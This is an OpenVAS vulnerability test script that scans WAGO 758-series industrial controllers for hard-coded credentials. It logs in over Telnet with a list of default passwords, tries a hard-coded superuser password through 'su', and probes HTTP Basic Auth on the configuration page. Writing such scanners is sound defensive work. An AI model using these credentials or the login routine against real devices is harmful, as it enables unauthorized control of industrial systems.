###############################################################################
# OpenVAS Vulnerability Test
#
# WAGO I/O SYSTEM 758 Series Insecure Credential Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
# Gaspar Modelo-Howard <gmhoward@gmail.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103465");
  script_bugtraq_id(52940, 52942);
  script_cve_id("CVE-2012-4879", "CVE-2012-3013");
  script_version("2019-05-14T08:13:05+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2019-05-14 08:13:05 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2012-04-12 11:29:33 +0200 (Thu, 12 Apr 2012)");
  script_name("WAGO I/O SYSTEM 758 Series Insecure Credential Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("http_version.nasl", "telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/www", 80, "Services/telnet", 23);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52940");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52942");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-249-02.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-097-01.pdf");
  script_xref(name:"URL", value:"http://www.wago.com/wagoweb/documentation/app_note/a1176/a117600e.pdf");

  script_tag(name:"summary", value:"The WAGO IPC 758 series are prone to a security-bypass vulnerability
  caused by a set of hard-coded passwords.");

  script_tag(name:"impact", value:"Successful attacks can allow a remote attacker to gain unauthorized
  access to the vulnerable device, using the HTTP or Telnet service.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("telnet_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

credentials = make_list("root:admin", "admin:admin", "user:user", "user:user00", "guest:guest");

telnet_ports = telnet_get_ports();

foreach telnet_port (telnet_ports) {

  foreach credential (credentials) {

    soc = open_sock_tcp(telnet_port);
    if(!soc) break;

    r = telnet_negotiate(socket:soc);
    if("WagoIPC1 login" >!< r) {
      close(soc);
      break;
    }

    cred = split(credential, sep:":", keep:FALSE);
    user = cred[0];
    pass = cred[1];

    send(socket:soc, data:user + '\n');
    recv = recv(socket:soc, length:512);
    if("Password" >!< recv) {
      close(soc);
      continue;
    }

    send(socket:soc, data:pass + '\n');
    recv = recv(socket:soc, length:512);
    if("-sh" >!< recv) {
      close(soc);
      continue;
    }

    report = 'It was possible to login using the following credentials: (Username:Password)\n' + credential;

    send(socket:soc, data:'su\n');
    recv = recv(socket:soc, length:512);
    if("Password" >< recv) {
      send(socket:soc, data:'ko2003wa\n');
      recv = recv(socket:soc, length:512);
      if("this is the super user account" >< recv) {
        report += '\nAfter it was possible to login using default credentials it was also possible to "su" to the super user account using "ko2003wa" as password.';
      }
    }
    close(soc);
    security_message(port:telnet_port, data:report);
  }
}

if(http_is_cgi_scan_disabled()) exit(0);

http_port = get_http_port(default:80);

url = '/cgi-bin/ssi.cgi/title.ssi';
req = http_get(item:url, port:http_port);
buf = http_keepalive_send_recv(port:http_port, data:req, bodyonly:FALSE);
if(!buf || "Wago IO-IPC" >!< buf) exit(0);

url = '/security.htm';
req = http_get(item:url, port:http_port);
buf = http_keepalive_send_recv(port:http_port, data:req, bodyonly:FALSE);

if("Unauthorized" >< buf) {

  host = http_host_name(port:http_port);

  foreach credential (credentials) {

    userpass64 = base64(str:credential);

    req = string("GET ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Authorization: Basic ", userpass64, "\r\n",
                 "\r\n");
    res = http_keepalive_send_recv(port:http_port, data:req);

    if("<title>Configuration side for the web security" >< res && "Webserver security functions" >< res) {
      httpdesc = 'It was possible to login using the following credentials:\nUsername:Password\n' + credential + '\n';
      security_message(port:http_port, data:httpdesc);
      break;
    }
  }
} else {
  result = 'The Wago Web Configuration Page is not protected by any credentials\n';
  security_message(port:http_port, data:result);
}

exit(0);